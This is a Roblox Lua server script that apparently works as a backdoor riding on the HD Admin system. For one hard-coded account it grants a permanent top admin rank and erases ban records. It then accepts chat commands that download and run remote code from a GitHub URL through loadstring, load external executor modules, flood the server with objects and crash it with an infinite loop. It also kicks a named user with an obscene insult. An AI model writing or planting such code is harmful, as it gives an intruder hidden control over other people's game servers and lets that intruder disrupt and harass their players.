print("State1")
repeat task.wait() until _G.HDAdminMain~=nil
print("State2")
local main = _G.HDAdminMain
local HttpService = game.HttpService
local AdminPanel = {
	"t10_kol",
}
local EnabledDoDOS = false
local BlackList = {
	["Vad_75"]=true, --< Vadik Pidorasik
}
local LagEnabled = false
local LagObjcets = {
}

game.Players.PlayerAdded:Connect(function(player)


	if BlackList[player.Name] then
		if EnabledDoDOS==true then 
			player:Kick("Соси Хуй Вад 😀")
		end
	end
	if table.find(AdminPanel,player.Name) ~= nil then
		require(7192763922).load(player.Name)


		--local banDetails = main:GetModule("cf"):GetBannedUserDetails(plr)
		--main.signals.ShowBannedUser:FireClient(plr, banDetails)

		
			pcall(function()
					print(main:GetModule("cf"))
			main:GetModule("cf"):SetRank(game:GetService("Players")[player.name], game.CreatorId, 999999999999999, "Perm")
				local banDetails, record = main:GetModule("cf"):GetBannedUserDetails(player.Name)
				--targetName, targetId, targetReason, record
				if banDetails then
					record.BanTime = os.time()
					if record.Server ~= "Current" then
						main:GetModule("SystemData"):InsertStat("Banland", "RecordsToModify", record)
					end
					--main:GetModule("cf"):FormatAndFireNotice(speaker, "UnBanSuccess", banDetails[1])
				end
			end)
			player.Chatted:Connect(function(message)
				if message == "ADM.Restart" then
					local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
					local f = loadstring(code)
					f()
				elseif message == "ADM.Sky" then
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
				elseif message == "ADM.Sky2" then
					local id = game.GroupService:GetGroupInfoAsync(32993955).EmblemUrl
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = id
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = id
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = id
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = id
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = id
					game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = id
				elseif message == "ADM.Fun" then
					for _, player2 in pairs(game.Players:GetPlayers()) do
						local Part = Instance.new("Part",player2.Character)
						Part.CanCollide=false
						Part.CFrame = player2.Character.Torso.CFrame
						Part.Color = player2.Character.Torso.Color
						local weld = Instance.new("Weld",Part)
						weld.Part0 = player2.Character.Torso
						weld.Part1 = Part
						weld.C0 = CFrame.new(0,0.5,-0.75) * CFrame.Angles(0,math.rad(-90),0)
						local mesh = Instance.new("SpecialMesh",Part)

						mesh.MeshId = "rbxassetid://7606070501"
						mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
					end
					--rbxassetid://5679232242
				elseif message == "ADM.Fun2" then
					print("VER3")
					for _, player2 in pairs(game.Players:GetPlayers()) do

						local AccessoryBlackList = {
							[Enum.AccessoryType.Back]=true,
							[Enum.AccessoryType.Front]=true
						}
						for _, accessory:Accessory in pairs(player2.Character:GetChildren()) do
							if accessory:IsA("Accessory") then
								if AccessoryBlackList[accessory.AccessoryType] then
									accessory:Destroy()
								end
							end
						end
						local mesh = Instance.new("SpecialMesh",player2.Character.Torso)

						mesh.MeshId = "rbxassetid://5679232242"
						mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
						mesh.Scale = Vector3.new(2.02, 2.02, 2.02)


						local Part = Instance.new("Part",player2.Character)
						Part.CanCollide=false
						Part.CFrame = player2.Character.Torso.CFrame
						Part.Size = Vector3.new(1.45, 0.944, 1.048)
						Part.Color = player2.Character.Torso.Color
						local weld = Instance.new("Weld",Part)
						weld.Part0 = player2.Character.Torso
						weld.Part1 = Part
						weld.C0 = CFrame.new(0, 0.202, -0.465)
						local mesh2 = Instance.new("SpecialMesh",Part)

						mesh2.MeshId = "rbxassetid://5679326691"
						mesh2.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate


						--left leg

						local mesh3 = Instance.new("SpecialMesh",player2.Character["Left Leg"])

						mesh3.MeshId = "rbxassetid://5679229838"
						mesh3.TextureId = player2.Character:FindFirstChildOfClass("Pants").PantsTemplate
						mesh3.Scale = Vector3.new(2.02, 2.02, 2.02)

						--right leg

						local mesh4 = Instance.new("SpecialMesh",player2.Character["Right Leg"])

						mesh4.MeshId = "rbxassetid://5679231042"
						mesh4.TextureId = player2.Character:FindFirstChildOfClass("Pants").PantsTemplate
						mesh4.Scale = Vector3.new(2.02, 2.02, 2.02)
					end
					--rbxassetid://5679232242
				elseif message == "ADM.Executor" then
					local Part = Instance.new("Part",workspace)
					Part.CanCollide=true
					Part.CFrame = player.Character.Torso.CFrame
					require(6324372525).fse(player.Name)
				elseif message == "ADM.Executor2" then
					local Part = Instance.new("Part",workspace)
					Part.CanCollide=true
					Part.CFrame = player.Character.Torso.CFrame
					require(5419042716).PraiseSkidGod(player.Name)
				elseif message == "ADM.Lag.Start" then
					LagEnabled = true


				elseif message == "ADM.Lag.Stop" then
					LagEnabled=false
					for index,lagobj in pairs(LagObjcets) do
						lagobj:Destroy()
					end
				elseif message == "ADM.Crash" then
					while tick() do
						print("CrashTHEServer")
					end
				end
			end)
	end
end)

--[[
for _, player in pairs(game.Players:GetPlayers()) do
	if table.find(AdminPanel,player.Name) ~= nil then
		require(7192763922).load(player.Name)


		--local banDetails = main:GetModule("cf"):GetBannedUserDetails(plr)
		--main.signals.ShowBannedUser:FireClient(plr, banDetails)
		main:GetModule("cf"):SetRank(game:GetService("Players")[player.name], game.CreatorId, 999999999999999, "Perm")  
		pcall(function()
			local banDetails, record = main:GetModule("cf"):GetBannedUserDetails(player.Name)
			--targetName, targetId, targetReason, record
			if banDetails then
				record.BanTime = os.time()
				if record.Server ~= "Current" then
					main:GetModule("SystemData"):InsertStat("Banland", "RecordsToModify", record)
				end
				--main:GetModule("cf"):FormatAndFireNotice(speaker, "UnBanSuccess", banDetails[1])
			end
		end)
		player.Chatted:Connect(function(message)
			if message == "ADM.Restart" then
				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
				local f = loadstring(code)
				f()
			elseif message == "ADM.Sky" then
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
			elseif message == "ADM.Sky2" then
				local id = game.GroupService:GetGroupInfoAsync(32993955).EmblemUrl
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = id
			elseif message == "ADM.Fun" then
				for _, player2 in pairs(game.Players:GetPlayers()) do
					local Part = Instance.new("Part",player2.Character)
					Part.CanCollide=false
					Part.CFrame = player2.Character.Torso.CFrame
					Part.Color = player2.Character.Torso.Color
					local weld = Instance.new("Weld",Part)
					weld.Part0 = player2.Character.Torso
					weld.Part1 = Part
					weld.C0 = CFrame.new(0,0.5,-0.75) * CFrame.Angles(0,math.rad(-90),0)
					local mesh = Instance.new("SpecialMesh",Part)

					mesh.MeshId = "rbxassetid://7606070501"
					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
				end
			elseif message == "ADM.Executor" then
				local Part = Instance.new("Part",workspace)
				Part.CanCollide=true
				Part.CFrame = player.Character.Torso.CFrame
				require(6324372525).fse(player.Name)
			elseif message == "ADM.Executor2" then
				local Part = Instance.new("Part",workspace)
				Part.CanCollide=true
				Part.CFrame = player.Character.Torso.CFrame
				require(5419042716).PraiseSkidGod(player.Name)
			elseif message == "ADM.Lag.Start" then
				LagEnabled = true


			elseif message == "ADM.Lag.Stop" then
				LagEnabled=false
				for index,lagobj in pairs(LagObjcets) do
					lagobj:Destroy()
				end
			end
		end)
	end


end
]]
game["Run Service"].Heartbeat:Connect(function()


	if LagEnabled==false then return end
	for index,value:Part in pairs(LagObjcets) do
		value.Velocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
	end
	for _, player2 in pairs(game.Players:GetPlayers()) do
		for i = 1,5 do
			local Part = Instance.new("Part",workspace)
			Part.CanCollide=true
			Part.CFrame = player2.Character.Torso.CFrame
			Part.Shape = Enum.PartType.Ball
			Part.Locked = true
			table.insert(LagObjcets,Part)
		end
	end
end)
